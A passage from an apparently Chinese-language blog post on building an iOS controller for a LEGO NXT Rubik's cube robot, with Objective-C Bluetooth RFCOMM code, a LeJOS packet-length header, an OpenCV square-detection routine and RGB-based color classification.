</span><span class='line'>                            <span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">rfcommDelegate</span> <span class="n">rfcommConnectionClosedForConnectionID</span><span class="o">:</span><span class="n">rfcomm_channel_id</span><span class="p">];</span>
</span><span class='line'>                            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                        <span class="nl">default:</span>
</span><span class='line'>                            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                    <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                <span class="k">case</span> <span class="n">RFCOMM_DATA_PACKET</span>:
</span><span class='line'>                    <span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;Received from 0x%02X %@&quot;</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="p">[</span><span class="n">NSData</span> <span class="n">dataWithBytes</span><span class="o">:</span><span class="n">packet</span> <span class="n">length</span><span class="o">:</span><span class="n">size</span><span class="p">]);</span>
</span><span class='line'>                    <span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">rfcommDelegate</span> <span class="n">rfcommDataReceivedForConnectionID</span><span class="o">:</span><span class="n">channel</span> <span class="n">withData</span><span class="o">:</span><span class="n">packet</span> <span class="n">ofLen</span><span class="o">:</span><span class="n">size</span><span class="p">];</span>
</span><span class='line'>                    <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="p">[</span><span class="n">self</span> <span class="n">discoveryHandleEvent</span><span class="o">:</span><span class="n">packet</span> <span class="n">withLen</span><span class="o">:</span><span class="n">size</span><span class="p">];</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// -- omitted --</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="o">-</span><span class="p">(</span><span class="n">BTstackError</span><span class="p">)</span> <span class="n">createRFCOMMConnectionAtAddress</span><span class="o">:</span><span class="p">(</span><span class="kt">bd_addr_t</span><span class="o">*</span><span class="p">)</span> <span class="n">address</span> <span class="n">withChannel</span><span class="o">:</span><span class="p">(</span><span class="kt">uint16_t</span><span class="p">)</span><span class="n">channel</span> <span class="n">authenticated</span><span class="o">:</span><span class="p">(</span><span class="kt">BOOL</span><span class="p">)</span><span class="n">authentication</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">state</span> <span class="o">&lt;</span> <span class="n">kActivated</span><span class="p">)</span> <span class="k">return</span> <span class="n">BTSTACK_NOT_ACTIVATED</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">state</span> <span class="o">!=</span> <span class="n">kActivated</span><span class="p">)</span> <span class="k">return</span> <span class="n">BTSTACK_BUSY</span><span class="p">;</span>
</span><span class='line'>    <span class="n">bt_send_cmd</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rfcomm_create_channel</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">channel</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'><span class="k">-</span><span class="p">(</span><span class="n">BTstackError</span><span class="p">)</span> <span class="nf">sendRFCOMMPacket:</span><span class="p">(</span><span class="n">NSData</span><span class="o">*</span><span class="p">)</span><span class="nv">packet</span> <span class="nf">ForConnectionId:</span><span class="p">(</span><span class="kt">uint16_t</span><span class="p">)</span><span class="nv">connectionId</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">state</span> <span class="o">&lt;</span> <span class="n">kActivated</span><span class="p">)</span> <span class="k">return</span> <span class="n">BTSTACK_NOT_ACTIVATED</span><span class="p">;</span>
</span><span class='line'>    <span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;Send to 0x%02X %@&quot;</span><span class="p">,</span> <span class="n">connectionId</span><span class="p">,</span> <span class="n">packet</span><span class="p">);</span>
</span><span class='line'>    <span class="n">bt_send_rfcomm</span><span class="p">(</span><span class="n">connectionId</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)[</span><span class="n">packet</span> <span class="n">bytes</span><span class="p">],</span> <span class="p">[</span><span class="n">packet</span> <span class="n">length</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'><span class="k">-</span><span class="p">(</span><span class="n">BTstackError</span><span class="p">)</span> <span class="nf">closeRFCOMMConnectionWithID:</span><span class="p">(</span><span class="kt">uint16_t</span><span class="p">)</span> <span class="n">connectionID</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">state</span> <span class="o">&lt;</span><span class="n">kActivated</span><span class="p">)</span> <span class="k">return</span> <span class="n">BTSTACK_NOT_ACTIVATED</span><span class="p">;</span>
</span><span class='line'>    <span class="n">bt_send_cmd</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hci_disconnect</span><span class="p">,</span><span class="n">connectionID</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>RFCOMM部分的代码实现完毕，尝试发送纯文本数据，结果LEGO根本毫无反应o(╯□╰)o。仔细阅读了LeJOS蓝牙部分的源码，发现数据包的头部，被添加了两个字节(Big-endian)用于标识数据包的大小:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">write</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="c1">// Send length of packet (Least and Most significant byte)</span>
</span><span class='line'>    <span class="c1">// * NOTE: Bluetooth only. </span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="na">write</span><span class="o">((</span><span class="kt">byte</span><span class="o">)</span><span class="n">data</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="na">write</span><span class="o">((</span><span class="kt">byte</span><span class="o">)(</span><span class="n">data</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">8</span><span class="o">));</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>这下就好办了，发送数据之前，先处理一下数据包，同样在头部插入两个字节的长度即可:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='objective-c'><span class='line'><span class="c1">// Util.m</span>
</span><span class='line'><span class="k">+</span><span class="p">(</span><span class="n">NSData</span> <span class="o">*</span><span class="p">)</span> <span class="nf">btDataForNxtWithString:</span> <span class="p">(</span><span class="n">NSString</span><span class="o">*</span><span class="p">)</span><span class="nv">string</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">const</span> <span class="kt">void</span><span class="o">*</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">UTF8String</span><span class="p">;</span>
</span><span class='line'>    <span class="n">NSInteger</span> <span class="n">length</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">u_int8_t</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">length</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>    <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">length</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">bytes</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>    <span class="n">NSData</span><span class="o">*</span> <span class="n">_data</span> <span class="o">=</span> <span class="p">[</span><span class="n">NSData</span> <span class="n">dataWithBytes</span><span class="o">:</span><span class="n">data</span> <span class="n">length</span><span class="o">:</span><span class="n">length</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
</span><span class='line'>    <span class="n">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
</span><span class='line'>    <span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;Send Data: %@&quot;</span><span class="p">,</span> <span class="n">_data</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">_data</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>深夜3点，测试一下RFCOMM通信</p>

<p><img src="http://xelz.info/assets/2017/bluetooth.jpg" alt="bluetooth" /></p>

<p>真是一把辛酸泪。。。</p>

<p><img src="http://xelz.info/assets/2017/cry.png" alt="cry" /></p>

<h3>扫描部分</h3>

<p>之前Android控制器的扫描部分存在两个遗留问题，一是无法自动采集魔方的颜色，二是对颜色的识别仍然存在不准的情况。这两个问题不解决，始终是心里的一个疙瘩。</p>

<p>如何自动采集魔方的颜色呢？如果能检测到魔方的位置，一切就好办了。那么问题转换成如何检测摄像头的画面中是否有魔方，以及魔方在画面中的位置。我先考虑了一种方案：</p>

<ul>
<li>检测画面中的直线，如果有其中8条直线能够组成一个九宫格的样式，则检测到魔方</li>
</ul>


<p>怎么检测直线呢？经过一番Google，找到了基于iOS开源图像处理框架GPUImage的一种算法。事实证明，我还是too young, too naive：</p>

<p><img src="http://xelz.info/assets/2017/detect1.png" alt="detect1" /></p>

<p>不管如何调整检测参数，直线的数量都超乎我的想象，更何况，我根本想不出一种算法去判断他们是不是能组成九宫格的图案。。。</p>

<p>后来就到处扒图像识别相关的资料，发现了基于OpenCV的一个很有意思的<a href="https://github.com/opencv/opencv/blob/master/samples/cpp/squares.cpp">Demo</a>，可以识别图像中的正方形，新的识别方案就此诞生</p>

<ul>
<li>如果能从图像中检测到9个相互不覆盖的正方形，就可以近似认为检测到了魔方</li>
</ul>


<p><img src="http://xelz.info/assets/2017/detect2.png" alt="detect2" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
</pre></td><td class='code'><pre><code class='objective-c'><span class='line'><span class="kt">void</span> <span class="nf">findSquares</span><span class="p">(</span> <span class="n">Mat</span><span class="o">&amp;</span> <span class="n">image</span><span class="p">,</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">cv</span><span class="o">::</span><span class="n">Point</span><span class="o">&gt;</span> <span class="o">&gt;&amp;</span> <span class="n">squares</span> <span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">squares</span><span class="p">.</span><span class="n">clear</span><span class="p">();</span>
</span><span class='line'>    <span class="n">vector</span><span class="o">&lt;</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">cv</span><span class="o">::</span><span class="n">Point</span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="n">contours</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// find contours and store them all as a list</span>
</span><span class='line'>    <span class="n">findContours</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">contours</span><span class="p">,</span> <span class="n">CV_RETR_LIST</span><span class="p">,</span> <span class="n">CV_CHAIN_APPROX_SIMPLE</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">vector</span><span class="o">&lt;</span><span class="n">cv</span><span class="o">::</span><span class="n">Point</span><span class="o">&gt;</span> <span class="n">approx</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// test each contour</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span> <span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">contours</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="c1">// approximate contour with accuracy proportional</span>
</span><span class='line'>        <span class="c1">// to the contour perimeter</span>
</span><span class='line'>        <span class="n">approxPolyDP</span><span class="p">(</span><span class="n">Mat</span><span class="p">(</span><span class="n">contours</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="n">approx</span><span class="p">,</span> <span class="n">arcLength</span><span class="p">(</span><span class="n">Mat</span><span class="p">(</span><span class="n">contours</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="nb">true</span><span class="p">)</span><span class="o">*</span><span class="mf">0.05</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// square contours should have 4 vertices after approximation</span>
</span><span class='line'>        <span class="c1">// relatively large area (to filter out noisy contours)</span>
</span><span class='line'>        <span class="c1">// and be convex.</span>
</span><span class='line'>        <span class="c1">// Note: absolute value of an area is used because</span>
</span><span class='line'>        <span class="c1">// area may be positive or negative - in accordance with the</span>
</span><span class='line'>        <span class="c1">// contour orientation</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span> <span class="n">approx</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>           <span class="n">fabs</span><span class="p">(</span><span class="n">contourArea</span><span class="p">(</span><span class="n">Mat</span><span class="p">(</span><span class="n">approx</span><span class="p">)))</span> <span class="o">&gt;</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>           <span class="n">isContourConvex</span><span class="p">(</span><span class="n">Mat</span><span class="p">(</span><span class="n">approx</span><span class="p">))</span> <span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="kt">double</span> <span class="n">maxCosine</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">for</span><span class="p">(</span> <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span> <span class="p">){</span>
</span><span class='line'>                <span class="c1">// find the maximum cosine of the angle between joint edges</span>
</span><span class='line'>                <span class="kt">double</span> <span class="n">cosine</span> <span class="o">=</span> <span class="n">fabs</span><span class="p">(</span><span class="n">angle</span><span class="p">(</span><span class="n">approx</span><span class="p">[</span><span class="n">j</span><span class="o">%</span><span class="mi">4</span><span class="p">],</span> <span class="n">approx</span><span class="p">[</span><span class="n">j</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span> <span class="n">approx</span><span class="p">[</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">]));</span>
</span><span class='line'>                <span class="n">maxCosine</span> <span class="o">=</span> <span class="n">MAX</span><span class="p">(</span><span class="n">maxCosine</span><span class="p">,</span> <span class="n">cosine</span><span class="p">);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="kt">double</span> <span class="n">lineLength1</span> <span class="o">=</span> <span class="n">distance</span><span class="p">(</span><span class="n">approx</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">approx</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>            <span class="kt">double</span> <span class="n">lineLength2</span> <span class="o">=</span> <span class="n">distance</span><span class="p">(</span><span class="n">approx</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">approx</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// if cosines of all angles are small and border length almost equals</span>
</span><span class='line'>            <span class="c1">// (all angles are ~90 degree) then write quandrange</span>
</span><span class='line'>            <span class="c1">// vertices to resultant sequence</span>
</span><span class='line'>            <span class="c1">// then filter out big squares such as the whole facelet of the cube</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span> <span class="n">maxCosine</span> <span class="o">&lt;</span> <span class="mf">0.1</span>
</span><span class='line'>               <span class="o">&amp;&amp;</span> <span class="n">fabs</span><span class="p">(</span><span class="n">lineLength1</span> <span class="o">-</span> <span class="n">lineLength2</span><span class="p">)</span> <span class="o">/</span> <span class="n">MAX</span><span class="p">(</span><span class="n">lineLength1</span><span class="p">,</span> <span class="n">lineLength2</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mf">0.1</span>
</span><span class='line'>               <span class="o">&amp;&amp;</span> <span class="n">lineLength1</span> <span class="o">/</span> <span class="n">image</span><span class="p">.</span><span class="n">cols</span> <span class="o">&lt;</span> <span class="mf">0.3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="n">squares</span><span class="p">.</span><span class="n">empty</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>                    <span class="n">squares</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">approx</span><span class="p">);</span>
</span><span class='line'>                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                    <span class="c1">// make sure no overlap</span>
</span><span class='line'>                    <span class="k">for</span><span class="p">(</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">cv</span><span class="o">::</span><span class="n">Point</span><span class="o">&gt;&gt;::</span><span class="n">iterator</span> <span class="n">s</span> <span class="o">=</span> <span class="n">squares</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="n">squares</span><span class="p">.</span><span class="n">end</span><span class="p">();</span> <span class="n">s</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                        <span class="kt">int</span> <span class="n">contains</span> <span class="o">=</span> <span class="n">squareContains</span><span class="p">(</span><span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="n">approx</span><span class="p">);</span>
</span><span class='line'>                        <span class="k">if</span> <span class="p">(</span><span class="n">contains</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span> <span class="c1">//s contains approx</span>
</span><span class='line'>                            <span class="n">squares</span><span class="p">.</span><span class="n">erase</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span><span class='line'>                            <span class="n">squares</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">approx</span><span class="p">);</span>
</span><span class='line'>                            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">contains</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// approx contains s</span>
</span><span class='line'>                            <span class="k">break</span><span class="p">;</span> <span class="c1">// discard this approx</span>
</span><span class='line'>                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                            <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="n">squares</span><span class="p">.</span><span class="n">end</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                                <span class="n">squares</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">approx</span><span class="p">);</span>
</span><span class='line'>                                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                            <span class="p">}</span>
</span><span class='line'>                        <span class="p">}</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// printf(&quot;found %lu squares\n&quot;, squares.size());</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">squares</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">9</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">squares</span><span class="p">.</span><span class="n">clear</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// sort squares to sequence</span>
</span><span class='line'>        <span class="c1">// 0 1 2</span>
</span><span class='line'>        <span class="c1">// 3 4 5</span>
</span><span class='line'>        <span class="c1">// 6 7 8</span>
</span><span class='line'>        <span class="n">sort</span><span class="p">(</span><span class="n">squares</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">squares</span><span class="p">.</span><span class="n">end</span><span class="p">(),</span> <span class="n">compareTwoPointsWithY</span><span class="p">);</span>
</span><span class='line'>        <span class="n">sort</span><span class="p">(</span><span class="n">squares</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span><span class="o">+</span><span class="mi">0</span><span class="p">,</span> <span class="n">squares</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span> <span class="n">compareTwoPointsWithX</span><span class="p">);</span>
</span><span class='line'>        <span class="n">sort</span><span class="p">(</span><span class="n">squares</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span> <span class="n">squares</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span><span class="o">+</span><span class="mi">6</span><span class="p">,</span> <span class="n">compareTwoPointsWithX</span><span class="p">);</span>
</span><span class='line'>        <span class="n">sort</span><span class="p">(</span><span class="n">squares</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span><span class="o">+</span><span class="mi">6</span><span class="p">,</span> <span class="n">squares</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span><span class="o">+</span><span class="mi">9</span><span class="p">,</span> <span class="n">compareTwoPointsWithX</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>是不是很机智！当然，这个算法也会有傻逼的时候：</p>

<p><img src="http://xelz.info/assets/2017/detect3.png" alt="detect3" /></p>

<p>解决类似的问题需要再检测一下每个正方形之间的间距。不过，如果放在魔方机器人的底座上进行扫描，周围应该没有什么干扰项，多增加一部分计算的代码反而会影响画面的刷新率，也就无所谓了。</p>

<p>扫描完魔方的54个块之后，就需要对每个块的颜色进行识别分组，之前的算法是计算每个颜色与6个基准色(也就是每个面中心块的颜色)的色差，仍然会存在不准的情况，这次我扫描记录了大量颜色数据，从中分析出以下特征：</p>

<ul>
<li>白色块的RGB分量之和大于任何其他色块</li>
<li>绿色块的G分量与R/B分量的差值，是所有色块中最大的</li>
<li>除去白色与绿色，剩下的色块，B分量与R/G分量的差值，从大到小依次是

<ul>
<li>蓝色 > 红色 > 橙色 > 黄色</li>
</ul>
</li>
</ul>


<p>其实这样的比较方式，在昏暗的光线下，红色与橙色仍然非常相近，但根据测试，错误率大概不到3%，还算可以接受。因此，只需要对54个颜色进行多次不同维度的排序，就可以识别出正确的颜色</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='objective-c'><span class='line'><span class="k">-</span> <span class="p">(</span><span class="n">NSString</span> <span class="o">*</span><span class="p">)</span> <span class="nf">detectColors</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">sort</span><span class="p">(</span><span class="n">colorNodes</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">colorNodes</span><span class="p">.</span><span class="n">end</span><span class="p">(),</span> <span class="n">sortForWhite</span><span class="p">);</span> <span class="c1">// W X X X X X</span>
</span><span class='line'>    <span class="n">sort</span><span class="p">(</span><span class="n">colorNodes</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span> <span class="o">+</span> <span class="mi">9</span> <span class="p">,</span> <span class="n">colorNodes</span><span class="p">.</span><span class="n">end</span><span class="p">(),</span> <span class="n">sortForGreen</span><span class="p">);</span> <span class="c1">// W G X X X X</span>
</span><span class='line'>    <span class="n">sort</span><span class="p">(</span><span class="n">colorNodes</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span> <span class="o">+</span> <span class="mi">18</span> <span class="p">,</span> <span class="n">colorNodes</span><span class="p">.</span><span class="n">end</span><span class="p">(),</span> <span class="n">sortForBlue</span><span class="p">);</span> <span class="c1">// W G B R O Y</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">colors</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;WWWWWWWWWGGGGGGGGGBBBBBBBBBRRRRRRRRROOOOOOOOOYYYYYYYYY&quot;</span><span class="p">;</span>
